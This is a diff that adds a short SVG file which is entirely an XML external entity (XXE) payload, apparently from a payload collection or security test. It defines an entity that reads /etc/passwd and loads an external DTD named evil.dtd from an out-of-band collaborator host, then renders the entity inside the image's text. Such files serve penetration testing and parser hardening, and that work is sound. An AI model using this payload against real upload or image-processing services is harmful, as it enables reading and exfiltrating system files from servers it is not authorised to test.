@@ -1,0 +1,8 @@
+<!DOCTYPE svg [
+    <!ENTITY % xxe SYSTEM "file:///etc/passwd">
+    <!ENTITY % dtd SYSTEM "https://j7ru0hq55nzwmdeqmktk1eehz85zt3hs.oastify.com/evil.dtd">
+    %dtd;
+]>
+<svg width="200" height="200" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+    <text x="10" y="20">&xxe;</text>
+</svg>
